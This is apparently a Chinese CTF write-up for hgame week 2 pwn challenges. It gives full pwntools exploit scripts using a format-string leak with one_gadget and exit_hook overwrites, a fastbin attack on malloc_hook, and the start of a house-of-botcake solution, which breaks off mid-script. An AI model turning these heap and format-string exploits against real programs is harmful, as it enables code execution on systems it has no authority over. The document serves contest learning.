    <content type="html"><![CDATA[<h1 id="hgame-week2-pwn-wp"><a href="#hgame-week2-pwn-wp" class="headerlink" title="hgame week2 pwn wp"></a>hgame week2 pwn wp</h1><h2 id="YukkuiSay"><a href="#YukkuiSay" class="headerlink" title="YukkuiSay"></a>YukkuiSay</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>格式化字符串漏洞。泄漏libc地址和stack地址，再覆盖栈上<code>__libc_start_main</code>为<code>one_gadget</code>。</p><p><img src="/img/2022-hgame-week2/image-20230206231545855.png" alt="image-20230206231545855"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>ld = ELF(<span class="hljs-string">&#x27;./ld-2.31.so&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">31594</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sdl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myformat</span>(<span class="hljs-params">offset, addr, data</span>):<br>    A = data &amp; <span class="hljs-number">0xff</span><br>    B = (data &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    C = (data &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    D = (data &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;A: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(A)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;B: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(B)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;C: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(C)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;D: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(D)&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, y</span>):<br>        <span class="hljs-keyword">return</span> ((x - y) + <span class="hljs-number">0x100</span>) % <span class="hljs-number">0x100</span><br><br>    payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(A) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(B, A)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">1</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(C, B)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">2</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(D, C)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">3</span>)<br><br>    payload = payload.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    payload = payload.encode()<br><br>    payload += p64(addr)<br>    payload += p64(addr + <span class="hljs-number">1</span>)<br>    payload += p64(addr + <span class="hljs-number">2</span>)<br>    payload += p64(addr + <span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">return</span> payload<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;let Yukkri say?&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x98</span><br>p.send(payload)<br><br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br><br>libc_base = leak - <span class="hljs-number">0x1ed5c0</span><br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span><br>p.send(payload)<br><br>stack = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br><br>p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br>key = stack + <span class="hljs-number">8</span><br>payload = p64(key) + p64(key + <span class="hljs-number">1</span>) + p64(key + <span class="hljs-number">2</span>) + p64(key + <span class="hljs-number">3</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;prepared a gift for you: &#x27;</span>)<br><br>payload = myformat(<span class="hljs-number">8</span>, key, one_gadget)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>泄漏libc地址，覆盖exit_hook为one_gadget。</p><p>注意，_rtld_global在ld上，ld距离libc地址不确定，需要爆破偏移。</p><p>爆破脚本参考WJH师傅的脚本：<a href="https://blog.wjhwjhn.com/archives/593/">https://blog.wjhwjhn.com/archives/593/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>ld = ELF(<span class="hljs-string">&#x27;./ld-2.31.so&#x27;</span>)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sdl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myformat</span>(<span class="hljs-params">offset, addr, data</span>):<br>    A = data &amp; <span class="hljs-number">0xff</span><br>    B = (data &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    C = (data &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    D = (data &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;A: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(A)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;B: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(B)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;C: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(C)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;D: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(D)&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, y</span>):<br>        <span class="hljs-keyword">return</span> ((x - y) + <span class="hljs-number">0x100</span>) % <span class="hljs-number">0x100</span><br><br>    payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(A) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">6</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(B, A)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">1</span> + <span class="hljs-number">6</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(C, B)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">2</span> + <span class="hljs-number">6</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(D, C)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">3</span> + <span class="hljs-number">6</span>)<br><br>    payload = payload.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    payload = payload.encode()<br><br>    payload += p64(addr)<br>    payload += p64(addr + <span class="hljs-number">1</span>)<br>    payload += p64(addr + <span class="hljs-number">2</span>)<br>    payload += p64(addr + <span class="hljs-number">3</span>)<br><br>    p.send(payload)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>():<br>    p.recvuntil(<span class="hljs-string">&#x27;let Yukkri say?&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x98</span><br>    p.send(payload)<br><br>    leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br><br>    libc_base = leak - <span class="hljs-number">0x1ed5c0</span><br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-keyword">return</span> libc_base<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">libc_base, ld_base</span>):<br>    log.success(<span class="hljs-string">&#x27;ld_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(ld_base))<br><br>    gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>    one_gadget = libc_base + gadgets[<span class="hljs-number">0</span>]<br><br>    rtld_global = ld_base + ld.sym[<span class="hljs-string">&#x27;_rtld_global&#x27;</span>]<br>    exit_hook = rtld_global + <span class="hljs-number">0xf08</span><br><br>    p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br>    payload = p64(exit_hook) + p64(exit_hook + <span class="hljs-number">1</span>) + p64(exit_hook + <span class="hljs-number">2</span>) + p64(exit_hook + <span class="hljs-number">3</span>)<br>    p.sendline(payload)<br><br>    p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;n&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">&#x27;prepared a gift for you: &#x27;</span>)<br><br>    payload = myformat(<span class="hljs-number">2</span>, exit_hook, one_gadget)<br>    p.sendline(payload)<br>    <br><br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>        <span class="hljs-keyword">try</span>:<br>            p = process(fn)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;times: <span class="hljs-subst">&#123;x * <span class="hljs-number">10</span> + y&#125;</span>&#x27;</span>)<br><br>            libc_base = leak()<br>            offset = <span class="hljs-number">0x200000</span><br>            offset += x &lt;&lt; <span class="hljs-number">16</span><br>            offset += y &lt;&lt; <span class="hljs-number">12</span><br>            lg(<span class="hljs-string">&#x27;offset&#x27;</span>, offset)<br>            ld_base = libc_base + offset<br><br>            attack(libc_base, ld_base)<br>            <br>            p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>            p.recvline()<br>            temp = p.recv(timeout=<span class="hljs-number">0.5</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> temp:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(temp)<br><br>            p.interactive()<br><br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">except</span> EOFError:<br>            p.close()<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>本地可以打通，但是远程没有打通。</p><p><img src="/img/2022-hgame-week2/image-20230206232356089.png" alt="image-20230206232356089"></p><h2 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h2><p><code>fastbin attack</code>，覆盖malloc_hook为one_gadget，并使用realloc hook调整栈帧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script()<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30821</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">3</span>)<br><br>malloc_hook = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>realloc_hook = malloc_hook - <span class="hljs-number">0x8</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><br>gadgets = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf03a4</span>, <span class="hljs-number">0xf1247</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">3</span>]<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>, p64(malloc_hook - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x13</span> - <span class="hljs-number">0x8</span>) + p64(one_gadget) + p64(realloc + <span class="hljs-number">7</span>))<br><br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">9</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h2><p><code>house of botcake</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> 